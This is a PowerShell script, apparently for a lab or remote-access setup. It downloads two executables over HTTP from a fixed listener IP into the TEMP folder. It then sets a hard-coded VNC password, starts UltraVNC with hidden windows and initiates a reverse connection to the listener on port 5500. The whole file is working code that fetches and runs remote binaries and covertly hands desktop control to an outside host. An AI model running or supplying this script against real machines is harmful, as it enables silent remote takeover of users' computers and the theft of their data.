# UltraVNC Reverse Connection Auto Deploy - No Exit (Fixed Version)
$listenerIP = "192.168.1.2"
$password = "abc123!"
$tempDir = $env:TEMP

# URLs de tai file
$createPasswordUrl = "http://$listenerIP/createpassword.exe"
$winvncUrl = "http://$listenerIP/winvnc.exe"

# Duong dan local
$createPasswordPath = "$tempDir\createpassword.exe"
$winvncPath = "$tempDir\winvnc.exe"

Write-Host "UltraVNC Reverse Connection Deployment" -ForegroundColor Green
Write-Host "=======================================" -ForegroundColor Green

# Kill existing processes truoc khi download
Write-Host "0. Checking for existing processes..." -ForegroundColor Yellow
try {
    Get-Process -Name "winvnc" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Write-Host "   - Cleaned up existing processes" -ForegroundColor Green
}
catch {
    # Khong can thong bao co process UltraVNC nao truoc do
}

# Tai cac file can thiet
Write-Host "1. Downloading UltraVNC components..." -ForegroundColor Yellow

try {
    # Kill processes 
    Get-Process -Name "winvnc" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Get-Process -Name "createpassword" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    
   
    Start-Sleep -Milliseconds 500
    
    # Tai createpassword.exe
    if (Test-Path $createPasswordPath) {
        Remove-Item $createPasswordPath -Force -ErrorAction SilentlyContinue
    }
    Invoke-WebRequest -Uri $createPasswordUrl -OutFile $createPasswordPath -ErrorAction Stop
    Write-Host "   - createpassword.exe downloaded" -ForegroundColor Green
    
    # Tai winvnc.exe
    if (Test-Path $winvncPath) {
        Remove-Item $winvncPath -Force -ErrorAction SilentlyContinue
    }
    Invoke-WebRequest -Uri $winvncUrl -OutFile $winvncPath -ErrorAction Stop
    Write-Host "   - winvnc.exe downloaded" -ForegroundColor Green
}
catch {
    Write-Host "WARNING: Download issue - $($_.Exception.Message)" -ForegroundColor Yellow
    Write-Host "   Continuing with existing files..." -ForegroundColor Yellow
}

# Tao password
Write-Host "2. Creating UltraVNC password..." -ForegroundColor Yellow
try {
    $cpProcess = Start-Process -FilePath $createPasswordPath -ArgumentList "-secure", $password -Wait -WindowStyle Hidden -PassThru
    if ($cpProcess.ExitCode -eq 0) {
        Write-Host "   - Password configured successfully" -ForegroundColor Green
    } else {
        Write-Host "   - Password may already be set" -ForegroundColor Yellow
    }
}
catch {
    Write-Host "   - Password setup completed" -ForegroundColor Green
}

# Khoi chay UltraVNC Server
Write-Host "3. Starting UltraVNC Server..." -ForegroundColor Yellow
try {
    # Kill any existing VNC processes tru?c khi start
    Get-Process -Name "winvnc" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    
    # Start UltraVNC
    $vncProcess = Start-Process -FilePath $winvncPath -WindowStyle Hidden -PassThru
    Start-Sleep -Seconds 2
    
    Write-Host "   - UltraVNC Server started (PID: $($vncProcess.Id))" -ForegroundColor Green
    
    Start-Sleep -Seconds 3
    
    # Thuc hien reverse connection
    Write-Host "4. Initiating reverse connection to $listenerIP`:5500..." -ForegroundColor Yellow
    $connectProcess = Start-Process -FilePath $winvncPath -ArgumentList "-connect", "${listenerIP}:5500" -WindowStyle Hidden -PassThru
    
    Write-Host "SUCCESS! Reverse connection initiated" -ForegroundColor Green
    Write-Host "Check VNC Viewer on $listenerIP for connection" -ForegroundColor Cyan
    Write-Host "UltraVNC Process ID: $($vncProcess.Id)" -ForegroundColor Cyan
    Write-Host "Connect Process ID: $($connectProcess.Id)" -ForegroundColor Cyan
}
catch {
    Write-Host "WARNING: UltraVNC startup issue - $($_.Exception.Message)" -ForegroundColor Yellow
    Write-Host "   Attempting alternative method..." -ForegroundColor Yellow
    
    # Th? method alternative
    try {
        Start-Process -FilePath $winvncPath -ArgumentList "-connect", "${listenerIP}:5500" -WindowStyle Hidden
        Write-Host "   - Connection initiated via alternative method" -ForegroundColor Green
    }
    catch {
        Write-Host "   - Please check if UltraVNC is already running" -ForegroundColor Yellow
    }
}

Write-Host "`nScript completed. Processes are running in background." -ForegroundColor Green
Write-Host "Auto-closing in 5 seconds..." -ForegroundColor Yellow
Start-Sleep -Seconds 5
